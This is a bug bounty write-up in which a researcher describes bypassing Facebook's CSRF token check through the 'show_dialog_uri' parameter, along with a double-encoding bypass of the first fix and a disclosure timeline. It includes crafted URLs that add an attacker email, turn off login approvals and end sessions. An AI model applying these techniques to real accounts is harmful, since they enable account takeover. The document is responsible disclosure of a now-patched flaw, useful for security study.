---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2015-09-04_how-i-bypassed-facebook-csrf-protection.md
original_filename: 2015-09-04_how-i-bypassed-facebook-csrf-protection.md
title: How I bypassed Facebook CSRF Protection
category: documents
detected_topics:
- csrf
- command-injection
- mfa
- otp
- api-security
tags:
- imported
- documents
- csrf
- command-injection
- mfa
- otp
- api-security
language: en
raw_sha256: 23816584e207f3fcfc8a5f11c04286e84ca9dc24cb1868e691e553ade006ca6c
text_sha256: 964171c52a7a9f8d6c86d54a9cba7fc408f1c9e7eb60f80ab2c928883accf634
ingested_at: '2026-06-28T07:31:55Z'
sensitivity: unknown
redactions_applied: false
---

# How I bypassed Facebook CSRF Protection

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2015-09-04_how-i-bypassed-facebook-csrf-protection.md
- Source Type: markdown
- Detected Topics: csrf, command-injection, mfa, otp, api-security
- Ingested At: 2026-06-28T07:31:55Z
- Redactions Applied: False
- Raw SHA256: `23816584e207f3fcfc8a5f11c04286e84ca9dc24cb1868e691e553ade006ca6c`
- Text SHA256: `964171c52a7a9f8d6c86d54a9cba7fc408f1c9e7eb60f80ab2c928883accf634`


## Content

---
title: "How I bypassed Facebook CSRF Protection"
page_title: "How I bypassed Facebook CSRF Protection
  | 
  Dynamic World"
url: "https://blog.darabi.me/2015/04/bypass-facebook-csrf.html"
final_url: "https://www.darabi.me/2015/04/bypass-facebook-csrf.html"
authors: ["Pouya Darabi (@Pouyadarabi)"]
programs: ["Meta / Facebook"]
bugs: ["CSRF"]
bounty: "15,000"
publication_date: "2015-09-04"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 6343
---

#  How I bypassed Facebook CSRF Protection 

[ 2015 ](https://www.darabi.me/search/label/2015) [ bounty ](https://www.darabi.me/search/label/bounty) [ bug ](https://www.darabi.me/search/label/bug) [ bypass ](https://www.darabi.me/search/label/bypass) [ critical ](https://www.darabi.me/search/label/critical) [ CSRF ](https://www.darabi.me/search/label/CSRF) [ facebook ](https://www.darabi.me/search/label/facebook) [ facebook exploit ](https://www.darabi.me/search/label/facebook%20exploit) [ vulnerability ](https://www.darabi.me/search/label/vulnerability)  
__ Pouya  __[ 2:35 AM  ](https://www.darabi.me/2015/04/bypass-facebook-csrf.html "permanent link") __[ 36 comments ](https://www.darabi.me/2015/04/bypass-facebook-csrf.html#comment-form)

  

  
  

![bypass facebook csrf 2015](https://cdn.darabi.me/cdn/cyber-security.jpg)

  
  
  

I discovered a critical vulnerability in Facebook that allowed an attacker to bypasses Facebook CSRF protection!  
  
more information about CSRF at [owasp](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29)  
  
  
'fb_dtsg' Anti-CSRF token supposed to get validated at server-side  
and if an action request doesn't that token, Facebook will drop the request without any process on it!  
( not all actions ;-) )  
  
I start tests on migration flow and before the migration, Facebook show me this URL  
  
  
https://www.facebook.com/ads/manage/home/?account_id=XXXX&show_dialog_uri=/ads/manage/error/graydisabled/?account_id=XXXX  
  
in that page, a dialog showed up for update gray account to personal account !  

![](https://cdn.darabi.me/cdn/change_login.png)

  
I checked connections in page load and saw a request was sent to "/ads/manage/error/graydisabled/?account_id=XXXX"  
  

> POST /ads/manage/error/graydisabled/?account_id=XXXX HTTP/1.1  
>  Host: www.facebook.com  
>  Accept-Language: en-us,en;q=0.5  
>  Accept-Encoding: gzip, deflate  
>  Connection: keep-alive  
>  Cookie:  
>  Content-Type: application/x-www-form-urlencoded  
>  
>  account_id=XXXXX  
>  __asyncDialog=1  
>  __user=  
>  __a=1  
>  __dyn=  
>  __req=  
>  fb_dtsg=  
>  ttstamp=  
>  __rev=

  
  
I looked at this request and something attract me  
account_id was sent in request URL and body!  
  
so I change it to "https://www.facebook.com/ads/manage/home/?show_dialog_uri=/ads/manage/error/graydisabled/?aaaa=XXXX"  
and the request after page load :  
  

> POST /ads/manage/error/graydisabled/?aaaa=XXXX HTTP/1.1  
>  Host: www.facebook.com  
>  Accept-Language: en-us,en;q=0.5  
>  Accept-Encoding: gzip, deflate  
>  Connection: keep-alive  
>  Cookie:  
>  Content-Type: application/x-www-form-urlencoded  
>  
>  aaaa=XXXXX  
>  __asyncDialog=1  
>  __user=  
>  __a=1  
>  __dyn=  
>  __req=  
>  fb_dtsg=  
>  ttstamp=  
>  __rev=

  
CSRF Token, custom field in body and a relative URL in Facebook  
So I used this to bypass Facebook CSRF protection! :D  

####  List: 

All actions could used here,this list is example

\-----------------------------------------

links are working with this prefix : https://www.facebook.com/  
  

#####  Change language to Persian :

> /ads/manage/home/?show_dialog_uri=/ajax/settings/account/language.php?new_language=fa_IR

#####  Add email [[email protected]](/cdn-cgi/l/email-protection) to account :

Account takeover :)

  

> /ads/manage/home/?show_dialog_uri=/settings/email/add/submit/[[email protected]](/cdn-cgi/l/email-protection)

#####  turn off login approval

> /ads/manage/home/?show_dialog_uri=/ajax/settings/security/approvals.php?just_enabled_approvals=0

#####  Logout all mobile

> /ads/manage/home/?show_dialog_uri=/ajax/settings/mobile/lost_phone.php

#####  Logout all sessions 

> /ads/manage/home/?show_dialog_uri=/ajax/settings/security/sessions/stop_all.php

  
  

  

  

![](https://cdn.darabi.me/cdn/csrf_2015_1.png)

  
  
  
After this fix  
I couldn't change prefix ! show_dialog_uri should have this prefix "/ads/manage/error/graydisabled/?"  
  
I tried "/ads/manage/error/graydisabled/?/test/test/"  
but after "?" all of "/" convert to "%2F"  
and I couldn't able to change current directory !  
  
Fnally, I bypassed the fix with double encoding!  
  
%253F  
  
AsyncDialog remove this char and send request ;)  
this was the last url :  
  

> https://www.facebook.com/ads/manage/home/?account_id&show_dialog_uri=%2Fads%2Fmanage%2Ferror%2Fgraydisabled%2F%253F%2F..%2F..%2F..%2F..%2F..%2Fsettings%2Femail%2Fadd%2Fsubmit%2F%3Fnew_email%3Dpouya%40darabi.me

  

![](https://cdn.darabi.me/cdn/csrf_2015_2.png)

  

  

  

  
"show_dialog_uri" removed by Facebook Security Team! ;)  
  

###  Timeline: 

  * Mar 29 2015 04:07pm : Initial report
  * Mar 29 2015 09:15pm : Add more details 
  * Mar 30 2015 12:57am : Bug acknowledged by security team
  * Mar 30 2015 02:10am : Temporary fix was pushed
  * Mar 30 2015 02:52am : I replay it with a way for bypass
  * Mar 30 2015 03:19am : Bypass blocked
  * Mar 31 2015 07:10am: Facebook Security Team rewarded me with a $15,000.

  
  
  

  * [ __ ](https://www.facebook.com/sharer.php?u=https://www.darabi.me/2015/04/bypass-facebook-csrf.html&t=How I bypassed Facebook CSRF Protection "Share on facebook")
  * [ __ ](https://twitter.com/intent/tweet?text=How I bypassed Facebook CSRF Protection&url=https://www.darabi.me/2015/04/bypass-facebook-csrf.html "Share on Twitter")
  * [ __ ](https://pinterest.com/pin/create/button/?url=https://www.darabi.me/2015/04/bypass-facebook-csrf.html)
  * [ __ ](https://www.linkedin.com/shareArticle?mini=true&url=https://www.darabi.me/2015/04/bypass-facebook-csrf.html)

[ Older Post ](https://www.darabi.me/2015/03/facebook-bypass-ads-account-roles.html "Older Post")

[ Newer Post ](https://www.darabi.me/2016/05/how-i-bypassed-facebook-csrf-in-2016.html "Newer Post")
  *[
2:35 AM
]: 2015-04-09T02:35:00-07:00
